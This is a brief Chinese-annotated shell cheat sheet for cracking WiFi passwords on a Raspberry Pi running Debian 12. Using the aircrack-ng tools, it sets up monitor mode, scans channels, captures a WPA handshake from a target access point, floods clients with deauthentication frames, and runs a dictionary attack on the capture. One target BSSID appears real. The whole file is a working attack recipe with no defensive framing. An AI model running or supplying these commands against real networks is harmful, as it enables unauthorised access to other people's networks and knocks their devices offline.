# 树莓派破解wifi
# 系统： debian12
iwconfig
wc=wlx0c882a003d6a
sudo airmon-ng check kill
sudo airmon-ng start $wc
wc=wlan1mon
sudo airodump-ng -D $wc
# 监听5G
sudo airodump-ng -C 5170-5825 -D $wc
# 监听抓包
sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one

sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0 --ignore-negative-one

# 破解密码
sudo aircrack-ng -w wordlist.dic -b 00:11:22:33:44:55 WPAcrack.cap

sudo aircrack-ng -w wpa专用.txt -b 9C:9D:7E:7E:AD:CD    airCap-01.cap